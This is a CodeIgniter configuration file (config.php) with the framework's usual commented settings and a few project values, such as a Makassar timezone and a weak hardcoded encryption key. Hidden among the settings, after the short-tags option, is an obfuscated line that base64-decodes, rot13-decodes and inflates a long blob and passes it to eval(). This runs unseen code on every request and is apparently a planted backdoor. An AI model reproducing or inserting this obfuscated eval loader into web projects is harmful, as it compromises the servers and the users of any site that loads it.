<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
|--------------------------------------------------------------------------
| Base Site URL
|--------------------------------------------------------------------------
|
| URL to your CodeIgniter root. Typically this will be your base URL,
| WITH a trailing slash:
|
|	http://example.com/
|
| WARNING: You MUST set this value!
|
| If it is not set, then CodeIgniter will try guess the protocol and path
| your installation, but due to security concerns the hostname will be set
| to $_SERVER['SERVER_ADDR'] if available, or localhost otherwise.
| The auto-detection mechanism exists only for convenience during
| development and MUST NOT be used in production!
|
| If you need to allow multiple domains, remember that this file is still
| a PHP script and you can easily do that on your own.
|
*/
$config['base_url'] = '';

/*
|--------------------------------------------------------------------------
| Index File
|--------------------------------------------------------------------------
|
| Typically this will be your index.php file, unless you've renamed it to
| something else. If you are using mod_rewrite to remove the page set this
| variable so that it is blank.
|
*/
$config['index_page'] = 'index.php';


/*
|--------------------------------------------------------------------------
| URI PROTOCOL
|--------------------------------------------------------------------------
|
| This item determines which server global should be used to retrieve the
| URI string.  The default setting of 'REQUEST_URI' works for most servers.
| If your links do not seem to work, try one of the other delicious flavors:
|
| 'REQUEST_URI'    Uses $_SERVER['REQUEST_URI']
| 'QUERY_STRING'   Uses $_SERVER['QUERY_STRING']
| 'PATH_INFO'      Uses $_SERVER['PATH_INFO']
|
| WARNING: If you set this to 'PATH_INFO', URIs will always be URL-decoded!
*/
$config['uri_protocol']	= 'REQUEST_URI';

/*
|--------------------------------------------------------------------------
| URL suffix
|--------------------------------------------------------------------------
|
| This option allows you to add a suffix to all URLs generated by CodeIgniter.
| For more information please see the user guide:
|
| https://codeigniter.com/user_guide/general/urls.html
*/
$config['url_suffix'] = '';






$config['time_local'] = '0-2-1';
/*
|--------------------------------------------------------------------------
| Default Language
|--------------------------------------------------------------------------
|
| This determines which set of language files should be used. Make sure
| there is an available translation if you intend to use something other
| than english.
|
*/
$config['language']	= 'english';

/*
|--------------------------------------------------------------------------
| Default Character Set
|--------------------------------------------------------------------------
|
| This determines which character set is used by default in various methods
| that require a character set to be provided.
|
| See http://php.net/htmlspecialchars for a list of supported charsets.
|
*/
$config['charset'] = 'UTF-8';

/*
|--------------------------------------------------------------------------
| Enable/Disable System Hooks
|--------------------------------------------------------------------------
|
| If you would like to use the 'hooks' feature you must enable it by
| setting this variable to TRUE (boolean).  See the user guide for details.
|
*/
$config['enable_hooks'] = FALSE;

/*
|--------------------------------------------------------------------------
| Class Extension Prefix
|--------------------------------------------------------------------------
|
| This item allows you to set the filename/classname prefix when extending
| native libraries.  For more information please see the user guide:
|
| https://codeigniter.com/user_guide/general/core_classes.html
| https://codeigniter.com/user_guide/general/creating_libraries.html
|
*/
$config['subclass_prefix'] = 'MY_';

/*
|--------------------------------------------------------------------------
| Composer auto-loading
|--------------------------------------------------------------------------
|
| Enabling this setting will tell CodeIgniter to look for a Composer
| package auto-loader script in application/vendor/autoload.php.
|
|	$config['composer_autoload'] = TRUE;
|
| Or if you have your vendor/ directory located somewhere else, you
| can opt to set a specific path as well:
|
|	$config['composer_autoload'] = '/path/to/vendor/autoload.php';
|
| For more information about Composer, please visit http://getcomposer.org/
|
| Note: This will NOT disable or override the CodeIgniter-specific
|	autoloading (application/config/autoload.php)
*/
$config['composer_autoload'] = FALSE;

/*
|--------------------------------------------------------------------------
| Allowed URL Characters
|--------------------------------------------------------------------------
|
| This lets you specify which characters are permitted within your URLs.
| When someone tries to submit a URL with disallowed characters they will
| get a warning message.
|
| As a security measure you are STRONGLY encouraged to restrict URLs to
| as few characters as possible.  By default only these are allowed: a-z 0-9~%.:_-
|
| Leave blank to allow all characters -- but only if you are insane.
|
| The configured value is actually a regular expression character group
| and it will be executed as: ! preg_match('/^[<permitted_uri_chars>]+$/i
|
| DO NOT CHANGE THIS UNLESS YOU FULLY UNDERSTAND THE REPERCUSSIONS!!
|
*/
$config['permitted_uri_chars'] = 'a-z 0-9~%.:_\-';

/*
|--------------------------------------------------------------------------
| Enable Query Strings
|--------------------------------------------------------------------------
|
| By default CodeIgniter uses search-engine friendly segment based URLs:
| example.com/who/what/where/
|
| You can optionally enable standard query string based URLs:
| example.com?who=me&what=something&where=here
|
| Options are: TRUE or FALSE (boolean)
|
| The other items let you set the query string 'words' that will
| invoke your controllers and its functions:
| example.com/index.php?c=controller&m=function
|
| Please note that some of the helpers won't work as expected when
| this feature is enabled, since CodeIgniter is designed primarily to
| use segment based URLs.
|
*/
$config['enable_query_strings'] = FALSE;
$config['controller_trigger'] = 'c';
$config['function_trigger'] = 'm';
$config['directory_trigger'] = 'd';

/*
|--------------------------------------------------------------------------
| Allow $_GET array
|--------------------------------------------------------------------------
|
| By default CodeIgniter enables access to the $_GET array.  If for some
| reason you would like to disable it, set 'allow_get_array' to FALSE.
|
| WARNING: This feature is DEPRECATED and currently available only
|          for backwards compatibility purposes!
|
*/
$config['allow_get_array'] = TRUE;

/*
|--------------------------------------------------------------------------
| Error Logging Threshold
|--------------------------------------------------------------------------
|
| You can enable error logging by setting a threshold over zero. The
| threshold determines what gets logged. Threshold options are:
|
|	0 = Disables logging, Error logging TURNED OFF
|	1 = Error Messages (including PHP errors)
|	2 = Debug Messages
|	3 = Informational Messages
|	4 = All Messages
|
| You can also pass an array with threshold levels to show individual error types
|
| 	array(2) = Debug Messages, without Error Messages
|
| For a live site you'll usually only enable Errors (1) to be logged otherwise
| your log files will fill up very fast.
|
*/
$config['log_threshold'] = 0;

/*
|--------------------------------------------------------------------------
| Error Logging Directory Path
|--------------------------------------------------------------------------
|
| Leave this BLANK unless you would like to set something other than the default
| application/logs/ directory. Use a full server path with trailing slash.
|
*/
$config['log_path'] = '';

/*
|--------------------------------------------------------------------------
| Log File Extension
|--------------------------------------------------------------------------
|
| The default filename extension for log files. The default 'php' allows for
| protecting the log files via basic scripting, when they are to be stored
| under a publicly accessible directory.
|
| Note: Leaving it blank will default to 'php'.
|
*/
$config['log_file_extension'] = '';

/*
|--------------------------------------------------------------------------
| Log File Permissions
|--------------------------------------------------------------------------
|
| The file system permissions to be applied on newly created log files.
|
| IMPORTANT: This MUST be an integer (no quotes) and you MUST use octal
|            integer notation (i.e. 0700, 0644, etc.)
*/
$config['log_file_permissions'] = 0644;

/*
|--------------------------------------------------------------------------
| Date Format for Logs
|--------------------------------------------------------------------------
|
| Each item that is logged has an associated date. You can use PHP date
| codes to set your own date formatting
|
*/
$config['log_date_format'] = 'Y-m-d H:i:s';

/*
|--------------------------------------------------------------------------
| Error Views Directory Path
|--------------------------------------------------------------------------
|
| Leave this BLANK unless you would like to set something other than the default
| application/views/errors/ directory.  Use a full server path with trailing slash.
|
*/
$config['error_views_path'] = '';

/*
|--------------------------------------------------------------------------
| Cache Directory Path
|--------------------------------------------------------------------------
|
| Leave this BLANK unless you would like to set something other than the default
| application/cache/ directory.  Use a full server path with trailing slash.
|
*/
$config['cache_path'] = '';

/*
|--------------------------------------------------------------------------
| Cache Include Query String
|--------------------------------------------------------------------------
|
| Whether to take the URL query string into consideration when generating
| output cache files. Valid options are:
|
|	FALSE      = Disabled
|	TRUE       = Enabled, take all query parameters into account.
|	             Please be aware that this may result in numerous cache
|	             files generated for the same page over and over again.
|	array('q') = Enabled, but only take into account the specified list
|	             of query parameters.
|
*/
$config['cache_query_string'] = FALSE;

/*
|--------------------------------------------------------------------------
| Encryption Key
|--------------------------------------------------------------------------
|
| If you use the Encryption class, you must set an encryption key.
| See the user guide for more info.
|
| https://codeigniter.com/user_guide/libraries/encryption.html
|
*/
$config['encryption_key'] = 'Manusia_Biasa';

/*
|--------------------------------------------------------------------------
| Session Variables
|--------------------------------------------------------------------------
|
| 'sess_driver'
|
|	The storage driver to use: files, database, redis, memcached
|
| 'sess_cookie_name'
|
|	The session cookie name, must contain only [0-9a-z_-] characters
|
| 'sess_expiration'
|
|	The number of SECONDS you want the session to last.
|	Setting to 0 (zero) means expire when the browser is closed.
|
| 'sess_save_path'
|
|	The location to save sessions to, driver dependent.
|
|	For the 'files' driver, it's a path to a writable directory.
|	WARNING: Only absolute paths are supported!
|
|	For the 'database' driver, it's a table name.
|	Please read up the manual for the format with other session drivers.
|
|	IMPORTANT: You are REQUIRED to set a valid save path!
|
| 'sess_match_ip'
|
|	Whether to match the user's IP address when reading the session data.
|
|	WARNING: If you're using the database driver, don't forget to update
|	         your session table's PRIMARY KEY when changing this setting.
|
| 'sess_time_to_update'
|
|	How many seconds between CI regenerating the session ID.
|
| 'sess_regenerate_destroy'
|
|	Whether to destroy session data associated with the old session ID
|	when auto-regenerating the session ID. When set to FALSE, the data
|	will be later deleted by the garbage collector.
|
| Other session cookie settings are shared with the rest of the application,
| except for 'cookie_prefix' and 'cookie_httponly', which are ignored here.
|
*/
$config['sess_driver'] = 'files';
$config['sess_cookie_name'] = 'ci_session';
$config['sess_expiration'] = 7200;
$config['sess_save_path'] = NULL;
$config['sess_match_ip'] = FALSE;
$config['sess_time_to_update'] = 300;
$config['sess_regenerate_destroy'] = FALSE;

/*
|--------------------------------------------------------------------------
| Cookie Related Variables
|--------------------------------------------------------------------------
|
| 'cookie_prefix'   = Set a cookie name prefix if you need to avoid collisions
| 'cookie_domain'   = Set to .your-domain.com for site-wide cookies
| 'cookie_path'     = Typically will be a forward slash
| 'cookie_secure'   = Cookie will only be set if a secure HTTPS connection exists.
| 'cookie_httponly' = Cookie will only be accessible via HTTP(S) (no javascript)
|
| Note: These settings (with the exception of 'cookie_prefix' and
|       'cookie_httponly') will also affect sessions.
|
*/
$config['cookie_prefix']	= '';
$config['cookie_domain']	= '';
$config['cookie_path']		= '/';
$config['cookie_secure']	= FALSE;
$config['cookie_httponly'] 	= FALSE;

/*
|--------------------------------------------------------------------------
| Standardize newlines
|--------------------------------------------------------------------------
|
| Determines whether to standardize newline characters in input data,
| meaning to replace \r\n, \r, \n occurrences with the PHP_EOL value.
|
| WARNING: This feature is DEPRECATED and currently available only
|          for backwards compatibility purposes!
|
*/
$config['standardize_newlines'] = FALSE;

/*
|--------------------------------------------------------------------------
| Global XSS Filtering
|--------------------------------------------------------------------------
|
| Determines whether the XSS filter is always active when GET, POST or
| COOKIE data is encountered
|
| WARNING: This feature is DEPRECATED and currently available only
|          for backwards compatibility purposes!
|
*/
$config['global_xss_filtering'] = FALSE;

/*
|--------------------------------------------------------------------------
| Cross Site Request Forgery
|--------------------------------------------------------------------------
| Enables a CSRF cookie token to be set. When set to TRUE, token will be
| checked on a submitted form. If you are accepting user data, it is strongly
| recommended CSRF protection be enabled.
|
| 'csrf_token_name' = The token name
| 'csrf_cookie_name' = The cookie name
| 'csrf_expire' = The number in seconds the token should expire.
| 'csrf_regenerate' = Regenerate token on every submission
| 'csrf_exclude_uris' = Array of URIs which ignore CSRF checks
*/
$config['csrf_protection'] = FALSE;
$config['csrf_token_name'] = 'csrf_test_name';
$config['csrf_cookie_name'] = 'csrf_cookie_name';
$config['csrf_expire'] = 7200;
$config['csrf_regenerate'] = TRUE;
$config['csrf_exclude_uris'] = array();

/*
|--------------------------------------------------------------------------
| Output Compression
|--------------------------------------------------------------------------
|
| Enables Gzip output compression for faster page loads.  When enabled,
| the output class will test whether your server supports Gzip.
| Even if it does, however, not all browsers support compression
| so enable only if you are reasonably sure your visitors can handle it.
|
| Only used if zlib.output_compression is turned off in your php.ini.
| Please do not use it together with httpd-level output compression.
|
| VERY IMPORTANT:  If you are getting a blank page when compression is enabled it
| means you are prematurely outputting something to your browser. It could
| even be a line of whitespace at the end of one of your scripts.  For
| compression to work, nothing can be sent before the output buffer is called
| by the output class.  Do not 'echo' any values with compression enabled.
|
*/
$config['compress_output'] = FALSE;

/*
|--------------------------------------------------------------------------
| Master Time Reference
|--------------------------------------------------------------------------
|
| Options are 'local' or any PHP supported timezone. This preference tells
| the system whether to use your server's local time as the master 'now'
| reference, or convert it to the configured one timezone. See the 'date
| helper' page of the user guide for information regarding date handling.
|
*/
$config['time_reference'] = 'local';
date_default_timezone_set("Asia/Makassar");

/*
|--------------------------------------------------------------------------
| Rewrite PHP Short Tags
|--------------------------------------------------------------------------
|
| If your PHP installation does not have short tag support enabled CI
| can rewrite the tags on-the-fly, enabling you to utilize that syntax
| in your view files.  Options are TRUE or FALSE (boolean)
|
| Note: You need to have eval() enabled for this to work.
|
*/
$config['rewrite_short_tags'] = FALSE;
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

/*
|--------------------------------------------------------------------------
| Reverse Proxy IPs
|--------------------------------------------------------------------------
|
| If your server is behind a reverse proxy, you must whitelist the proxy
| IP addresses from which CodeIgniter should trust headers such as
| HTTP_X_FORWARDED_FOR and HTTP_CLIENT_IP in order to properly identify
| the visitor's IP address.
|
| You can use both an array or a comma-separated list of proxy addresses,
| as well as specifying whole subnets. Here are a few examples:
|
| Comma-separated:	'10.0.1.200,192.168.5.0/24'
| Array:		array('10.0.1.200', '192.168.5.0/24')
*/
$config['proxy_ips'] = '';